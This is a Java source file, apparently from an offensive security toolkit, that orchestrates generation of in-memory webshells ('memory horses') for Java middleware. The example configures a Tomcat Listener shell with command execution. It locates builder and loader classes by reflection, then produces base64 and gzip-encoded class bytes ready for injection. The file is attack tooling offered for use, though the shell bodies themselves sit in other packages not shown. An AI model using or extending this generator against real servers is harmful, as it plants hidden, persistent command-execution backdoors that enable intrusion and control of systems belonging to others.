package com.ppp.scheduler;

import com.ppp.JavaClassHelper;
import com.ppp.Printer;
import com.ppp.annotation.*;
import com.ppp.utils.maker.ClassUtils;
import com.ppp.utils.maker.CryptoUtils;

import java.lang.reflect.Method;
import java.util.List;

/**
 * @author Whoopsunix
 * 内存马生成
 */
@JavaClassHelperType(JavaClassHelperType.MemShell)
public class MemShellScheduler {
    private static String builderPackageName = "com.ppp.middleware.builder";
    private static String loaderPackageName = "com.ppp.middleware.loader";
    private static String msPackageName = "com.ppp.middleware.memshell";

    public static void main(String[] args) throws Exception {
        JavaClassHelper javaClassHelper = new JavaClassHelper();
        javaClassHelper.setJavaClassHelperType(JavaClassHelperType.MemShell);
        javaClassHelper.setMiddleware(Middleware.Tomcat);
        javaClassHelper.setMemShell(MemShell.Listener);
        javaClassHelper.setMemShellFunction(MemShellFunction.Exec);

        // 内存马信息
        javaClassHelper.setHEADER("xxx");


        build(javaClassHelper);
    }

    public static byte[] build(JavaClassHelper javaClassHelper) throws Exception {
        String middleware = javaClassHelper.getMiddleware();
        String memShell = javaClassHelper.getMemShell();
        String memShellFunction = javaClassHelper.getMemShellFunction();

        // 用于打印信息

        /**
         * 获取 Builder
         */
        Class loaderBuilderClass = null;
        Class msBuilderClass = null;

        List<Class<?>> builderClasses = ClassUtils.getClasses(builderPackageName);
        for (Class<?> clazz : builderClasses) {
            Builder builder = clazz.getAnnotation(Builder.class);
            if (builder == null) continue;

            Middleware middlewareAnnotation = clazz.getAnnotation(Middleware.class);
            if (middlewareAnnotation == null) continue;

            // 获取 Loader Builder
            if (builder.value().equalsIgnoreCase(Builder.Loader) && middlewareAnnotation.value().equalsIgnoreCase(middleware)) {
                loaderBuilderClass = clazz;
                Printer.blueInfo("Loader builder Class: " + clazz.getName() + ", Annotation Value: " + builder.value());
            }
            // 获取 MemShell Builder
            if (builder.value().equalsIgnoreCase(Builder.MS) && middlewareAnnotation.value().equalsIgnoreCase(middleware)) {
                msBuilderClass = clazz;
                Printer.blueInfo("MemShell builder Class: " + clazz.getName() + ", Annotation Value: " + builder.value());
            }
        }

        // 组件不支持
        if (loaderBuilderClass == null) {
            Printer.error(String.format("Loader builder Class Not Found, Middleware %s is not supported", middleware));
        }
        // 内存马 Builder 未找到
        if (msBuilderClass == null) {
            Printer.error("MemShell builder Class Not Found");
        }

        /**
         * 生成 Builder
         *  即定位到具体的执行方法
         */
        Method msMethod = null;
        Method loaderMethod = null;

        Method[] msMethods = msBuilderClass.getDeclaredMethods();
        for (Method method : msMethods) {
            MemShell memShellAnnotation = method.getAnnotation(MemShell.class);
            if (memShellAnnotation == null) continue;

            MemShellFunction memShellFunctionAnnotation = method.getAnnotation(MemShellFunction.class);
            if (memShellFunctionAnnotation == null) continue;

            if (memShellAnnotation.value().equalsIgnoreCase(memShell) && memShellFunctionAnnotation.value().equalsIgnoreCase(memShellFunction)) {
                msMethod = method;
                Printer.blueInfo("MS builder Method: " + method.getName() + ", Annotation Value: " + memShellAnnotation.value());
                break;
            }
        }

        Method[] loaderMethods = loaderBuilderClass.getDeclaredMethods();
        for (Method method : loaderMethods) {
            MemShell memShellAnnotation = method.getAnnotation(MemShell.class);
            if (memShellAnnotation == null) continue;

            if (memShellAnnotation.value().equalsIgnoreCase(memShell)) {
                loaderMethod = method;
                Printer.blueInfo("Loader builder Method: " + method.getName() + ", Annotation Value: " + memShellAnnotation.value());
                break;
            }
        }

        /**
         * 获取 Loader 和 MemShell
         */
        Class loaderClass = null;
        Class msClass = null;

        List<Class<?>> loaderClasses = ClassUtils.getClasses(loaderPackageName);
        for (Class<?> clazz : loaderClasses) {
            Middleware middlewareAnnotation = clazz.getAnnotation(Middleware.class);
            if (middlewareAnnotation == null) continue;
            if (middlewareAnnotation.value().equalsIgnoreCase(middleware)) {
                loaderClass = clazz;
                Printer.blueInfo("Loader Class: " + clazz.getName() + ", Annotation Value: " + middlewareAnnotation.value());
                break;
            }
        }

        List<Class<?>> msClasses = ClassUtils.getClasses(msPackageName);
        for (Class<?> clazz : msClasses) {
            MemShell memShellAnnotation = clazz.getAnnotation(MemShell.class);
            if (memShellAnnotation == null) continue;

            MemShellFunction memShellFunctionAnnotation = clazz.getAnnotation(MemShellFunction.class);
            if (memShellFunctionAnnotation == null) continue;

            if (memShellAnnotation.value().equalsIgnoreCase(memShell) && memShellFunctionAnnotation.value().equalsIgnoreCase(memShellFunction)) {
                msClass = clazz;
                Printer.blueInfo("MemShell Class: " + clazz.getName() + ", Annotation Value: " + memShellAnnotation.value());
                break;
            }
        }

        if (loaderClass == null) {
            Printer.error("Loader Class Not Found");
        }
        // 内存马种类不支持
        if (msClass == null) {
            Printer.error(String.format("The MemShell %s is not supported", memShell));
        }


        /**
         * 生成加载 Loader 和 MemShell
         */
        Object loaderBuilder = loaderBuilderClass.newInstance();
        Object msBuilder = msBuilderClass.newInstance();

        byte[] msJavaClassBytes = (byte[]) msMethod.invoke(msBuilder, msClass, javaClassHelper);
        String msJavaClassBase64 = CryptoUtils.base64encoder(msJavaClassBytes);
        Printer.yellowInfo("ms:");
        Printer.yellowInfo(msJavaClassBase64);
        // gzip
        byte[] msJavaClassGzipBytes = CryptoUtils.compress(msJavaClassBytes);
        String msJavaClassGzipBase64 = CryptoUtils.base64encoder(msJavaClassGzipBytes);

        byte[] msLoaderJavaClassBytes = (byte[]) loaderMethod.invoke(loaderBuilder, loaderClass, msJavaClassGzipBase64, javaClassHelper);
        String b64 = CryptoUtils.base64encoder(msLoaderJavaClassBytes);
        Printer.yellowInfo("ms+loader:");
        Printer.yellowInfo(b64);

        return msLoaderJavaClassBytes;

    }

}
